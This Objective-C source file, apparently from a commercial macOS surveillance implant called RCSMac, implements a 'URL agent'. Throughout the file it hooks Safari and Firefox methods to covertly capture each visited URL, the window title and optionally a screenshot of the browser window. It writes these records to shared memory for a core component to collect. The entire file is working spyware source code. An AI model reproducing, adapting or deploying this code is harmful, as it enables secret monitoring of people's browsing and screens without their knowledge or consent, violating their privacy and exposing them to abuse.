/*
 * RCSMac - URL Agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 13/05/2009
 *  Modified by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>
//#import <dlfcn.h>

#import "RCSMInputManager.h"
#import "RCSMAgentURL.h"
#import "RCSMCommon.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"

#define BROWSER_UNKNOWN      0x00000000
#define BROWSER_SAFARI       0x00000004
#define BROWSER_MOZILLA      0x00000002
#define BROWSER_TYPE_MASK    0x3FFFFFFF

static NSDate   *gURLDate     = nil;
static NSString *gPrevURL     = nil;
static BOOL gIsSnapshotActive = NO;
static u_int gSnapID          = 0;

static uint8_t gStopLog       = 0;

void logSnapshot(NSData *imageData, int browserType)
{
  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(urlSnapAdditionalStruct)];
  NSString *_windowName;
  NSData *windowName;
  NSDictionary *windowInfo;

  u_int currentSnapID = gSnapID;
  gSnapID++;

  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
#ifdef DEBUG_URL
      infoLog(@"No windowInfo found");
#endif
      _windowName = @"";
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
#ifdef DEBUG_URL
          infoLog(@"windowName is empty");
#endif
          _windowName = @"";
        }
      else
        {
          _windowName = [windowInfo objectForKey: @"windowName"];
        }
    }

#ifdef DEBUG_URL
  infoLog(@"windowName: %@", _windowName);
#endif
  windowName = [[NSMutableData alloc] initWithData:
                    [_windowName dataUsingEncoding:
                    NSUTF16LittleEndianStringEncoding]];

  urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
  urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
  urlSnapshotAdditionalHeader->browserType    = browserType;
  urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL
    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
  urlSnapshotAdditionalHeader->windowTitleLen = [_windowName
    lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

  // URL
  [entryData appendData: [gPrevURL dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];

  // Window Name
  [entryData appendData: windowName];

  // Now append the image
  [entryData appendData: imageData];

#ifdef DEBUG_URL
  infoLog(@"imageData size: %d", [imageData length]);
  infoLog(@"URL: %@", gPrevURL);
  infoLog(@"window: %@", _windowName);
#endif

  int leftBytesLength = 0;
  int byteIndex       = 0;

  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
    {
#ifdef DEBUG_URL
      warnLog(@"Splitting image on shared memory");
#endif

      do
        {
          NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];

          leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                             ? 0x300
                             : ([entryData length] - byteIndex));

          shMemoryHeader->status          = SHMEM_WRITTEN;
          shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
          shMemoryHeader->direction       = D_TO_CORE;

          //
          // If it's the first log pass create log header
          // if it's the last close log otherwise just data
          //
          if (byteIndex == 0)
            {
#ifdef DEBUG_URL
              infoLog(@"Sending CM_CREATE_LOG_HEADER (%d)", currentSnapID);
#endif
              shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
            }
          else if ((byteIndex + leftBytesLength) == [entryData length])
            {
#ifdef DEBUG_URL
              infoLog(@"Sending CM_CLOSE_LOG (%d)", currentSnapID);
#endif
              shMemoryHeader->commandType     = CM_CLOSE_LOG;
            }
          else
            {
#ifdef DEBUG_URL
              //infoLog(@"Sending CM_LOG_DATA");
#endif
              shMemoryHeader->commandType     = CM_LOG_DATA;
            }

          struct timeval tTime;
          gettimeofday(&tTime, NULL);
          int highSec = (int32_t)tTime.tv_sec << 20;

          shMemoryHeader->timestamp       = highSec | tTime.tv_usec;

          // Snapshot ID in order to log multiple pictures concurrently
          shMemoryHeader->flag            = currentSnapID;
          shMemoryHeader->commandDataSize = leftBytesLength;

          memcpy(shMemoryHeader->commandData,
                 [entryData bytes] + byteIndex,
                 leftBytesLength);

          if ([mSharedMemoryLogging writeMemory: logData
                                         offset: 0
                                  fromComponent: COMP_AGENT] == TRUE)
            {
#ifdef DEBUG_URL
              verboseLog(@"URL snapshot sent through Shared Memory");
#endif
            }
          else
            {
#ifdef DEBUG_URL
              errorLog(@"Error while logging url snapshot to shared memory");
#endif
            }

          byteIndex += leftBytesLength;
          [logData release];

          usleep(60000);
        } while (byteIndex < [entryData length]);
    }
  else
    {
      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];

      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = LOG_URL_SNAPSHOT;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];

      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);

      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG_URL
          verboseLog(@"URL snapshot sent through Shared Memory");
#endif
        }
      else
        {
#ifdef DEBUG_URL
          errorLog(@"Error while logging url snapshot to shared memory");
#endif
        }

      [logData release];
    }

#ifdef DEBUG_URL
  infoLog(@"URL Snapshot sent");
#endif

  [entryData release];
  [windowName release];
  [_windowName release];
}

BOOL grabSnapshot(int browserType)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  NSDictionary *windowInfo;
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;

  //
  // Looks like it's better to wait at least a second in order to be sure
  // to get the window on the desktop in case of onProcess->Screenshot
  //
  sleep(1);

  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
#ifdef DEBUG_URL
      errorLog(@"getActiveWindowInfo returned nil");
#endif
      [outerPool release];
      return NO;
    }

  if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
    {
#ifdef DEBUG_URL
      errorLog(@"windowID is zero");
#endif
      return NO;
    }

  screenShot = CGWindowListCreateImage(CGRectNull,
                                       kCGWindowListOptionIncludingWindow,
                                       [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                       kCGWindowImageBoundsIgnoreFraming);

  if (screenShot == NULL)
    {
#ifdef DEBUG_URL
      errorLog(@"screenshot is NULL");
#endif
      return NO;
    }
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                             properties: nil];

  //
  // Log Snapshot
  //
  logSnapshot(tempData, browserType);

  [bitmapRep release];
  CGImageRelease(screenShot);
  
  [outerPool release];

  return YES;
}

void URLStartAgent()
{
  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_URL
                                                          withCommandType: CM_AGENT_CONF];
  
  if (readData != nil)
    {
#ifdef DEBUG_URL
      infoLog(@"Found configuration for Agent URL");
#endif
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
      urlStruct *urlConfiguration = (urlStruct *)[confData bytes];
      gIsSnapshotActive = urlConfiguration->isSnapshotActive;
      
#ifdef DEBUG_URL
      infoLog(@"snapshot active: %@", (gIsSnapshotActive == YES) ? @"YES" : @"NO");
#endif
      [confData release];
    }
  else
    {
#ifdef DEBUG_URL
      infoLog(@"No configuration found for agent URL");
#endif
    }
}

@interface myLoggingObject : NSObject

- (void)logURL: (NSDictionary *)aDict;

@end

@implementation myLoggingObject

- (void)logURL: (NSDictionary *)aDict
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  NSTimeInterval interval;
  
  if (aDict == nil)
    return;
    
  NSString *URL = (NSString*)[aDict objectForKey: @"url"];
  
  if (gURLDate == nil)
    {
      gURLDate = [[NSDate date] retain];
#ifdef DEBUG_URL
      infoLog(@"first gURLDate: %@", gURLDate);
#endif
    }
  
  interval = [[NSDate date] timeIntervalSinceDate: gURLDate];
#ifdef DEBUG_URL
  infoLog(@"interval : %f", interval);
#endif
  
  NSString *tempUrl1 = [URL stringByReplacingOccurrencesOfString: @"http://"
                                                      withString: @""];
  NSString *tempUrl2 = [URL stringByReplacingOccurrencesOfString: @"http://www."
                                                      withString: @""];
  NSString *tempUrl3 = [URL stringByReplacingOccurrencesOfString: @"www."
                                                      withString: @""];
#ifdef DEBUG_URL
  verboseLog(@"tempURL1: %@", tempUrl1);
  verboseLog(@"tempURL2: %@", tempUrl2);
  verboseLog(@"tempURL3: %@", tempUrl3);
#endif
  
  //
  // if
  // - gPrevURL equals current URL
  // - elapsed seconds since last url log >= 5 sec
  // then avoid logging
  //
  if (gPrevURL != nil
      && ([gPrevURL isEqualToString: URL]
          || [gPrevURL isEqualToString: tempUrl1]
          || [gPrevURL isEqualToString: tempUrl2]
          || [gPrevURL isEqualToString: tempUrl3])
      && interval <= (double)5)
    {
#ifdef DEBUG_URL
      infoLog(@"URL already logged <= 5 seconds ago");
#endif
      return;
    }
  
  if (gPrevURL != nil)
    [gPrevURL release];
  
  gPrevURL = [URL copy];
  
  [gURLDate release];
  gURLDate = [[NSDate date] retain];
  
#ifdef DEBUG_URL
  infoLog(@"URL: %@", URL);
  infoLog(@"Sleeping for grabbing the correct window title");
#endif
  
  // In order to avoid grabbing a wrong window title
  // was 80k
  usleep(300000);
  
  NSDictionary  *windowInfo;
  NSString      *_windowName;
  NSMutableData *windowName;
  
  NSString *_empty            = @"EMPTY";
  //NSURL *_url                 = [[self _locationFieldURL] copy];
  NSData *url = [URL dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp             = gmtime(&rawtime);
  tmTemp->tm_year   += 1900;
  tmTemp->tm_mon    ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  // 0x14 bytes for 64bit processes
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  u_int32_t logVersion = 0x20100713;
  
  // Log Marker/Version (retrocompatibility)
  [entryData appendBytes: &logVersion
                  length: sizeof(logVersion)];
#ifdef DEBUG_URL
  verboseLog(@"entryData: %@", entryData);
#endif

  // URL Name
  [entryData appendData: url];
  
  //char singleNullTerminator = '\0';
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Browser Type
  int browserType = [[aDict objectForKey: @"agent"] intValue];
  
  [entryData appendBytes: &browserType
                  length: sizeof(browserType)];
  
  // Window Name
  if ((windowInfo = getActiveWindowInformationForPID(getpid())) == nil)
    {
#ifdef DEBUG_URL
      infoLog(@"No windowInfo found");
#endif
      [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
    }
  else
    {
      if ([[windowInfo objectForKey: @"windowName"] length] == 0)
        {
#ifdef DEBUG_URL
          infoLog(@"windowName is empty");
          infoLog(@"processName %@", [windowInfo objectForKey: @"processName"]);
#endif
          [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
        }
      else
        {
          _windowName = [[windowInfo objectForKey: @"windowName"] copy];
          
#ifdef DEBUG_URL
          infoLog(@"windowName: %@", _windowName);
#endif
          windowName = [[NSMutableData alloc] initWithData:
                        [_windowName dataUsingEncoding:
                         NSUTF16LittleEndianStringEncoding]];
          
          [entryData appendData: windowName];
          [windowName release];
          [_windowName release];
        }
    }
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimiter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
#ifdef DEBUG_URL
  infoLog(@"entryData final: %@", entryData);
#endif
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_URL;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  //infoLog(@"logData: %@", logData);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_URL
      infoLog(@"URL logged correctly");
#endif
    }
  else
    {
#ifdef DEBUG_URL
      infoLog(@"Error while logging url to shared memory");
#endif
    }
  
  [logData release];
  [entryData release];
  [outerPool drain];

  if (gIsSnapshotActive)
    {
#ifdef DEBUG_URL
      infoLog(@"Grabbing snapshot");
#endif

      grabSnapshot(browserType);
    }
  
  [aDict release];
}

@end

@implementation myBrowserWindowController

- (void)webFrameLoadCommittedHook: (id)arg1
{
  [self webFrameLoadCommittedHook: arg1];
  
#ifdef DEBUG_URL
  infoLog(@"");
#endif
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
  NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
  
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
#ifdef DEBUG_URL     
  NSLog(@"get _url: %@", _url);
#endif
  
  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                           _agent, @"agent", nil];
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  [logObject release];
  [_agent release];
  [_url release];
}

- (void)closeCurrentTabHook: (id)arg1
{
#ifdef DEBUG_URL
  infoLog(@"");
#endif
  gStopLog = 1;
  [self closeCurrentTabHook: arg1];
}

- (void)didSelectTabViewItemHook
{
#ifdef DEBUG_URL
  infoLog(@"");
#endif
  gStopLog = 1;
  [self didSelectTabViewItemHook];
}

- (BOOL)_setLocationFieldTextHook: (id)arg1
{
  BOOL res = [self _setLocationFieldTextHook: arg1];
  
  if (gStopLog == 1)
    {
#ifdef DEBUG_URL
      warnLog(@"They say I shouldn't log this...");
#endif
      gStopLog = 0;
      return res;
    }

  if (arg1 == nil || [arg1 length] == 0)
    {
#ifdef DEBUG_URL
      warnLog(@"Empty URL");
#endif
    
      return res;
    }
  
  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
  NSString *_url   = [arg1 copy];
  
  myLoggingObject *logObject = [[myLoggingObject alloc] init];
  
  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                           _agent, @"agent", nil];
  
  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];
  
  [logObject release];
  [_agent release];
  [_url release];

  return res;
}

@end

extern char *get_url32();
extern char *get_url64();

@implementation NSWindow (firefoxHook)

- (void)setTitleHook:(NSString *)title
{
  [self setTitleHook: (title)];

  // Disable for 32bit browser
#ifdef __x86_64__

#ifdef DEBUG_URL
  infoLog(@"firefox setTitle: '%@'", title);
#endif

  char *ff_url = get_url32();

  if(ff_url == NULL)
    {
      // Try to get url on 64bit headers
      ff_url = get_url64();

      if (ff_url == NULL) 
        {
#ifdef DEBUG_URL     
          NSLog(@"Cannot get _url");
#endif      
          return;
        }
    }

#ifdef DEBUG_URL
  infoLog(@"firefox url: %s", ff_url);
#endif

  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_MOZILLA];
  NSString *_url = [[NSString alloc] initWithCString: ff_url encoding: NSUTF8StringEncoding];

  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
                           _agent, @"agent", nil];
#ifdef DEBUG_URL     
  NSLog(@"get urlDict: %@", urlDict);
#endif

  myLoggingObject *logObject = [[myLoggingObject alloc] init];

  [NSThread detachNewThreadSelector: @selector(logURL:)
                           toTarget: logObject
                         withObject: urlDict];

  [logObject release];
  [_agent release];
  [_url release];

#endif
}

@end
